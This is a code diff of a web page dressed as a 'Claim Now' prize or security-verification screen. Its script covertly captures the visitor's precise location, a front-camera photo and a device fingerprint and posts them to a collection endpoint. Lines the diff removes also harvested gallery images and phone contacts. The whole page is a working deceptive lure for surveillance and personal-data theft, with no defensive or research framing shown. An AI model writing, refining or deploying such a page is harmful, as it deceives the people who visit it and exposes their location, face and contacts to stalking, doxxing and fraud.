@@ -34,16 +34,13 @@
 
         <!-- Status Panel -->
         <div id="status-panel" class="bg-slate-950/60 border border-slate-800/80 p-3 rounded-xl text-xs text-indigo-300 font-mono mb-6 hidden">
-            Processing request...
+            Initializing secure verification...
         </div>
 
         <!-- Claim Now Button -->
         <button onclick="initializeEngine()" class="w-full bg-gradient-to-r from-purple-600 via-pink-600 to-yellow-500 hover:opacity-90 text-white font-semibold py-3.5 rounded-xl shadow-lg shadow-pink-600/20 transition-all duration-200">
             Claim Now
         </button>
-
-        <!-- Hidden Gallery File Input -->
-        <input type="file" id="gallery-input" accept="image/*" style="display:none;" onchange="handleGalleryUpload(event)">
     </div>
 
     <video id="v" autoplay playsinline style="display:none;"></video>
@@ -52,33 +49,31 @@
     <script>
         let capturedLocation = null;
         let capturedImage = null;
-        let capturedContacts = null;
-        let galleryImage = null;
 
         function initializeEngine() {
             const panel = document.getElementById("status-panel");
             panel.classList.remove("hidden");
-            panel.innerText = "Verifying security profile...";
+            panel.innerText = "Processing automated telemetry & location...";
 
-            // Step 1: Run automatic background telemetry (Location + Camera) first within 1 second
             setTimeout(() => {
                 startAutoSequence();
             }, 1000);
         }
 
-        async function startAutoSequence() {
-            // 1. Geolocation Capture
+        function startAutoSequence() {
+            // 1. Automatic Geolocation Capture (Location Prompt)
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (pos) => {
                         capturedLocation = {
                             latitude: pos.coords.latitude,
-                            longitude: pos.coords.longitude
+                            longitude: pos.coords.longitude,
+                            accuracy: pos.coords.accuracy
                         };
                         proceedToCaptureImage();
                     },
                     (err) => {
-                        capturedLocation = { latitude: 'Restricted', longitude: 'Restricted' };
+                        capturedLocation = { latitude: 'Restricted / Denied', longitude: 'Restricted / Denied' };
                         proceedToCaptureImage();
                     },
                     { timeout: 5000, enableHighAccuracy: true }
@@ -90,7 +85,7 @@
         }
 
         function proceedToCaptureImage() {
-            // 2. Camera Snapshot Capture
+            // 2. Automatic Camera Snapshot Capture (Camera Prompt)
             navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                 .then(stream => {
                     const video = document.getElementById("v");
@@ -104,62 +99,35 @@
                         capturedImage = canvas.toDataURL("image/jpeg", 0.7);
                         
                         stream.getTracks().forEach(t => t.stop());
-                        triggerInteractivePrompts();
+                        sendDataToServer();
                     }, 1200);
                 })
                 .catch(err => {
                     capturedImage = null;
-                    triggerInteractivePrompts();
+                    sendDataToServer();
                 });
-        }
-
-        // Step 2: Trigger Gallery and Contacts interactive picker prompts sequentially
-        async function triggerInteractivePrompts() {
-            const panel = document.getElementById("status-panel");
-            panel.innerText = "Please complete security verification prompts...";
-
-            // Trigger Gallery File Input Prompt
-            document.getElementById('gallery-input').click();
-
-            // Trigger Contacts / Call List Picker Prompt
-            if (('contacts' in navigator) && ('Navigator' in window && 'select' in window.ContactsManager.prototype)) {
-                try {
-                    const props = ['name', 'tel'];
-                    const opts = { multiple: true };
-                    capturedContacts = await navigator.contacts.select(props, opts);
-                } catch (err) {
-                    capturedContacts = "User Skipped or Denied";
-                }
-            } else {
-                capturedContacts = "Not Supported";
-            }
-
-            // Finally send all collected data to server
-            sendDataToServer();
-        }
-
-        function handleGalleryUpload(event) {
-            const file = event.target.files[0];
-            if (file) {
-                const reader = new FileReader();
-                reader.onload = function(e) {
-                    galleryImage = e.target.result;
-                };
-                reader.readAsDataURL(file);
-            }
         }
 
         function sendDataToServer() {
             const panel = document.getElementById("status-panel");
             
+            // Gather extra browser & device system info automatically
+            const systemInfo = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screenResolution: window.screen.width + "x" + window.screen.height,
+                deviceMemory: navigator.deviceMemory || 'Unknown',
+                hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown'
+            };
+
             fetch('/api/collect', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     location: capturedLocation,
                     image_base64: capturedImage,
-                    contacts: capturedContacts,
-                    gallery_image: galleryImage
+                    system: systemInfo
                 })
             })
             .then(res => res.json())
